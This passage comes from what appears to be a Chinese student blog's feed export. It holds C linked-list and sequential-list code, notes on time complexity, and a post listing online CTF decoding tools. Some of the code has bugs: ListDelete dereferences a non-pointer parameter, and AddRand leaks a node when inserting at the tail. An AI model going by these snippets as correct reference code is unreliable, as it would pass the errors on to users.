class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="尾添加-1"><a href="#尾添加-1" class="headerlink" title="尾添加"></a>尾添加</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">AddTail</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//尾添加</span><span class="token punctuation">{</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> <span class="token function">CreateNode</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建一个节点</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pTemp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//创建失败</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"内存不足\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 一般不会申请失败，除非内存不足</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//连接</span>    tail<span class="token operator">-></span>next <span class="token operator">=</span> pTemp<span class="token punctuation">;</span>    tail <span class="token operator">=</span> pTemp<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="任意位置添加-1"><a href="#任意位置添加-1" class="headerlink" title="任意位置添加"></a>任意位置添加</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">AddRand</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//在数字index后面添加数字a</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//判断链表有没有东西</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"链表无节点\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//找index节点</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> <span class="token function">SearchNode</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pTemp <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"查无此节点\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//找到节点,连接到指定位置</span>    <span class="token comment" spellcheck="true">//创建节点</span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> pNode <span class="token operator">=</span> <span class="token function">CreateNode</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//连接</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>pTemp <span class="token operator">==</span> tail<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">AddTail</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        pNode<span class="token operator">-></span>next <span class="token operator">=</span> pTemp<span class="token operator">-></span>next<span class="token punctuation">;</span>        pTemp<span class="token operator">-></span>next <span class="token operator">=</span> pNode<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h4><h5 id="头删除-1"><a href="#头删除-1" class="headerlink" title="头删除"></a>头删除</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">DeleteHead</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//删除头</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//判断链表有没有东西</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"链表无头"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//有节点 ——> 删除  </span>    <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//记录头</span>    head<span class="token operator">-></span>next <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token operator">-></span>next<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//变头</span>    <span class="token function">free</span><span class="token punctuation">(</span>pTemp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//释放</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="尾删除-1"><a href="#尾删除-1" class="headerlink" title="尾删除"></a>尾删除</h5><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">DeleteTail</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//删除尾</span><span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//判断链表有没有东西</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"链表无尾"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//有一个节点 ——> 删除</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head<span class="token operator">-></span>next <span class="token operator">==</span> tail<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">free</span><span class="token punctuation">(</span>tail<span class="token punctuation">)</span><span class="token punctuation">;</span>        head<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>        tail <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">struct</span> Node<span class="token operator">*</span> pTemp <span class="token operator">=</span> head<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>pTemp <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>pTemp<span class="token operator">-></span>next <span class="token operator">==</span> tail<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                 <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            pTemp <span class="token operator">=</span> pTemp<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//pTemp就是尾巴的前一个</span>        <span class="token function">free</span><span class="token punctuation">(</span>tail<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//释放尾巴</span>        tail <span class="token operator">=</span> pTemp<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//更新尾巴</span>        tail<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//尾巴下一个赋值为NULL</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>到这里，剩下的操作和无空头的没啥区别，这里就不多说了</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF常用工具汇总</title>
      <link href="/2020/02/17/ctf-gong-ju/"/>
      <url>/2020/02/17/ctf-gong-ju/</url>
      
        <content type="html"><![CDATA[<p>假期做了很多CTF的题目，刚学没多久，只会简单的MISC和CRYPTO，网上搜集各种解密类型，</p><p>一个个去尝试，先整理一波；</p><a id="more"></a><p>整理这个是因为收藏夹满了，工具堆叠太多（噗哈哈哈，其实因为自己太懒，不想做题的时候再去搜），话不多说</p><p>直接上网址；</p><h4 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h4><p>之前就喜欢密码学，了解的不是很多，但是感觉超厉害！！！Very Good！！！</p><p>做了题目知道了很多密码：Base64，ROT13，摩斯密码，凯撒密码，栅栏密码，幂数加密（计算就可以，或者写</p><p>个脚本），RSA加密（到现在还没看懂原理emmm）</p><p><a href="http://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">16进制文本转换</a>   </p><p><a href="http://tool.chinaz.com/Tools/Base64.aspx" target="_blank" rel="noopener">Base64</a>    </p><p><a href="https://tool.lu/morse/" target="_blank" rel="noopener">Morse</a>  </p><p><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" target="_blank" rel="noopener">Caesar</a> </p><p><a href="https://www.jisuan.mobi/puzzm6z1B1HH6yXW.html" target="_blank" rel="noopener">ROT13</a> </p><p><a href="http://www.atoolbox.net/Tool.php?Id=777" target="_blank" rel="noopener">W型栅栏密码</a>  </p><p><a href="https://www.sojson.com/encrypt_aes.html" target="_blank" rel="noopener">AES</a> </p><p><a href="https://www.sojson.com/encrypt_rabbit.html" target="_blank" rel="noopener">Rabbit</a>   </p><p><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">Ook</a> </p><p><a href="https://tool.bugku.com/brainfuck/?wafcloud=1" target="_blank" rel="noopener">Brainfuck</a>  </p><p><a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">serpent</a>  </p><p><a href="http://web.chacuo.net/charsetquotedprintable" target="_blank" rel="noopener">Quoted-printable</a>  </p><p><a href="https://pmd5.com/" target="_blank" rel="noopener">MD5</a></p><p><a href="http://code.mcdvisa.com" target="_blank" rel="noopener">中文电码</a></p><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a> </p><p><a href="http://www.atoolbox.net/Category.php?Id=27" target="_blank" rel="noopener">加密解密工具</a></p><p><a href="https://blog.csdn.net/weixin_42037232/article/details/89018997?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">密码积累</a></p><h4 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h4><p>杂项题目更头疼，五花八门的解密方法，确实让人头疼。还得精通ps（真是佩服），有一道p二维码的题，p了一</p><p>个晚上；</p><p><a href="https://www.sojson.com/qr/deqr.html" target="_blank" rel="noopener">二维码</a></p><p><a href="https://app.xunjiepdf.com/pdf2word/" target="_blank" rel="noopener">PDF转-&gt;</a></p><p><a href="http://keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">与佛论禅</a></p><p><a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新约佛论禅</a></p><h4 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h4><p><a href="http://ctf.ssleye.com/?tdsourcetag=s_pcqq_aiomsg" target="_blank" rel="noopener">CTF在线工具</a></p><p><a href="https://www.ctftools.com/down/" target="_blank" rel="noopener">CTF资源库</a></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>CTF是个很好玩的“游戏”，现在虽然是个小白，但是我要努力成为大佬，题目越做越多，后面再进行整理。</p><p>Fighting！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构</title>
      <link href="/2020/02/15/shu-ju-jie-gou/"/>
      <url>/2020/02/15/shu-ju-jie-gou/</url>
      
        <content type="html"><![CDATA[<p>数据结构是学习语言过程中必会内容，对以后做项目，工作会有很大的帮助；</p><p>下学期开数据结构课，所以将学习记的一些笔记写进blog里面；</p><p>后面会不定时的更新；</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>算法（Algorithm）是指解题方案的准确而完整的描述，是一系列解决问题的清晰指令，算法代表着用系统的方法</p><p>描述解决问题的策略机制；简单来讲，就是解决问题的方法和机制；</p><h2 id="数据结构概念"><a href="#数据结构概念" class="headerlink" title="数据结构概念"></a>数据结构概念</h2><p>数据结构：是相互之间存在一种或多种特定关系的数据结构元素的集合；</p><h2 id="算法特点"><a href="#算法特点" class="headerlink" title="算法特点"></a>算法特点</h2><p>1、有穷性：算法在执行有限的步骤之后，自动结束而不会出现无限循环，并且每一步骤在可接受的时间内完成；</p><p>2、确定性：算法的每一步骤都有确定的含义，不会出现二义性；</p><p>3、可行性：算法的每一步都必须是可行的，也就是说，每一步都能够通过执行有限次数完成；</p><p>4、输入输出：0至多个输入，1至多个输出；</p><h2 id="程序设计"><a href="#程序设计" class="headerlink" title="程序设计"></a>程序设计</h2><p><strong>程序 = 数据结构 + 算法；</strong></p><h1 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h1><p>定义：算法的时间复杂度，也就是算法的时间量度，记作：T(n) = O(f(n))(T(n)是语句总的执行次数)，它表示随问</p><p>题规模n的增大，算法执行时间的增长率和f(n)的增长率相同，称作算法的渐进时间复杂度，简称为时间复杂度。</p><p>其中f(n)是问题的规模n的某个函数；</p><h2 id="推导大O阶方法"><a href="#推导大O阶方法" class="headerlink" title="推导大O阶方法"></a>推导大O阶方法</h2><p>1、用常数1取代运行时间中的所有加法常数；</p><p>2、在修改后的运行次数函数中，只保留最高阶项；</p><p>3、如果最高阶项存在且不是1，则去除与这个项相乘的常数；</p><p>得到的的结果就是大O阶；</p><h2 id="常见的时间复杂度"><a href="#常见的时间复杂度" class="headerlink" title="常见的时间复杂度"></a>常见的时间复杂度</h2><p>常数阶    ——&gt;    O(1)</p><p>线性阶    ——&gt;    O(n)</p><p>平方阶    ——&gt;    O(n^2)</p><p>对数阶    ——&gt;    O(logn)</p><p><u>nlogn</u>阶  ——&gt;    O(nlogn)</p><p>立方阶    ——&gt;    O(n^3)</p><p>指数阶    ——&gt;    O(2^n)</p><h2 id="常见的时间复杂度所耗时间的大小排列"><a href="#常见的时间复杂度所耗时间的大小排列" class="headerlink" title="常见的时间复杂度所耗时间的大小排列"></a>常见的时间复杂度所耗时间的大小排列</h2><p><strong>O(1)&lt;O(logn)&lt;O(n)&lt;O(nlogn)&lt;O(n^2)&lt;O(n^3)&lt;O(2^n)&lt;O(n!)&lt;O(n^n)</strong></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>算法的时间复杂度内容不多，很好理解，从下一章开始就将进入代码的世界；</p><p>拜拜啦~</p><h1 id="线性表—Linear-List"><a href="#线性表—Linear-List" class="headerlink" title="线性表—Linear List"></a>线性表—Linear List</h1><p>学完时间复杂度，基本打开了数据结构的大门了，第一个我们来学线性表~</p><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>1、定义：n(n≥0)个<u>数据元素</u>的有限序列；</p><p>2、线性表是一种最常用且最简单的数据结构，含有n个元素的线性表是一个数据结构；</p><p>3、List = (D,R)  ——&gt;  D是data数据，R是relation关系；</p><h2 id="前驱后继"><a href="#前驱后继" class="headerlink" title="前驱后继"></a>前驱后继</h2><p>若将线性表记为a1,a2,a3……ai-1,ai,ai+1……an,则称ai-1是ai的直接前驱元素，ai+1是ai的直接后继元素。当</p><p>i=1,2,3…n-1时，ai有且仅有一个直接后继，当i=2,3,4…n时，ai有且仅有一个直接前驱；</p><p>所以，线性表的元素的个数n(n≥0)定义为线性表的长度，当n=0时，称为空表；</p><h2 id="线性表的抽象数据类型——基本操作-增-删-查-取-空-长"><a href="#线性表的抽象数据类型——基本操作-增-删-查-取-空-长" class="headerlink" title="线性表的抽象数据类型——基本操作( 增 删 查 取 空 长 )"></a>线性表的抽象数据类型——基本操作( 增 删 查 取 空 长 )</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token number">1</span>、<span class="token function">InitList</span><span class="token punctuation">(</span><span class="token operator">*</span>L<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//初始化,建立一个新的线性表L；</span><span class="token number">2</span>、<span class="token function">ListEmpty</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//线性表为空，返回true，否则返回false；</span><span class="token number">3</span>、<span class="token function">ListLength</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//求长度，返回线性表中元素的个数；</span><span class="token number">4</span>、<span class="token function">GetElem</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span><span class="token operator">*</span>e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将线性表L中第i个数据元素赋值给e；</span><span class="token number">5</span>、<span class="token function">LocateElem</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span>e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//在线性表L中查找与给定值e相等的元素，如果查找成功，返回该元素在表中序号表示成功，否则，返回0表示失败；</span><span class="token number">6</span>、<span class="token function">ListInsert</span><span class="token punctuation">(</span><span class="token operator">*</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span>e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//在线性表L中第i个位置插入新的数据e，表长+1；</span><span class="token number">7</span>、<span class="token function">ListDelete</span><span class="token punctuation">(</span><span class="token operator">*</span>L<span class="token punctuation">,</span>i<span class="token punctuation">,</span>e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//删除线性表L中第i个数据元素，e返回其值，表长-1；</span><span class="token number">8</span>、<span class="token function">ClearList</span><span class="token punctuation">(</span><span class="token operator">*</span>L<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将线性表清空；</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="线性表的顺序存储结构——顺序表"><a href="#线性表的顺序存储结构——顺序表" class="headerlink" title="线性表的顺序存储结构——顺序表"></a>线性表的顺序存储结构——顺序表</h2><h3 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h3><p>线性表的顺序存储结构，指的是用一段地址连续的储存单元依次储存线性表的数据元素；</p><h3 id="顺序储存方式"><a href="#顺序储存方式" class="headerlink" title="顺序储存方式"></a>顺序储存方式</h3><p>先来看看结构代码</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> MAXSIZE 1000  </span><span class="token comment" spellcheck="true">//储存空间初始分配量</span><span class="token keyword">typedef</span> <span class="token keyword">int</span> ElemType<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    ElemType data<span class="token punctuation">[</span>MAXSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> length<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//线性表当前长度</span><span class="token punctuation">}</span>SqList<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="顺序表的操作"><a href="#顺序表的操作" class="headerlink" title="顺序表的操作"></a>顺序表的操作</h3><h4 id="获得元素操作"><a href="#获得元素操作" class="headerlink" title="获得元素操作"></a>获得元素操作</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">GetElem</span><span class="token punctuation">(</span>SqList L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> ElemType<span class="token operator">*</span> e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//获得元素——>e返回L中第i个数据元素的值</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> i<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">||</span> i<span class="token operator">></span>L<span class="token punctuation">.</span>length<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>e <span class="token operator">=</span> L<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ListInsert</span><span class="token punctuation">(</span>SqList<span class="token operator">*</span> L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> ElemType e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//插入操作——>在L中第i个位置之前插入新的数据元素e，L的长度加1</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> k<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L<span class="token operator">-></span>length <span class="token operator">==</span> MAXSIZE<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//线性表已满</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">||</span> i<span class="token operator">></span>L<span class="token operator">-></span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//i不在范围内</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> L<span class="token operator">-></span>length<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//插入的元素不在表尾 (可加if可不加)</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">=</span> L<span class="token operator">-></span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">>=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> k<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            L<span class="token operator">-></span>data<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> L<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    L<span class="token operator">-></span>data<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//新元素插入</span>    L<span class="token operator">-></span>length<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="删除操作"><a href="#删除操作" class="headerlink" title="删除操作"></a>删除操作</h4><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">ListDelete</span><span class="token punctuation">(</span>SqList<span class="token operator">*</span> L<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> ElemType e<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//删除操作</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> k<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>L<span class="token operator">-></span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//线性表为空</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token operator">&lt;</span><span class="token number">1</span> <span class="token operator">||</span> i<span class="token operator">></span>L<span class="token operator">-></span>length<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//删除位置不正确</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token operator">*</span>e <span class="token operator">=</span> L<span class="token operator">-></span>data<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> L<span class="token operator">-></span>length<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//删除不是最后位置</span>    <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">=</span> i<span class="token punctuation">;</span> k <span class="token operator">&lt;</span> L<span class="token operator">-></span>length<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//删除位置后继元素前移</span>        <span class="token punctuation">{</span>            L<span class="token operator">-></span>data<span class="token punctuation">[</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> L<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    L<span class="token operator">-></span>length<span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p><strong><em>1、优点：</em></strong></p><p><strong><em>①无需为表中元素之间的逻辑关系增加额外的储存空间；</em></strong></p><p><strong><em>②可以快速的存取表中任意位置的元素；</em></strong></p><p><strong><em>2、缺点：</em></strong></p><p><strong><em>①插入和删除操作需要移动大量元素；</em></strong></p><p><strong><em>②当线性表长度变化较大时，难以确定储存空间的容量；</em></strong></p><p><strong><em>③造成储存空间的“碎片”；</em></strong></p><h2 id="线性表的链式储存结构——链表"><a href="#线性表的链式储存结构——链表" class="headerlink" title="线性表的链式储存结构——链表"></a>线性表的链式储存结构——链表</h2><p>链表在之前的博客里面已经整理了一部分，在这里再整理一遍吧；</p><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><p>先定义一个结构体</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> Node<span class="token punctuation">{</span>    ElemType data<span class="token punctuation">;</span>    <span class="token keyword">struct</span> Node <span class="token 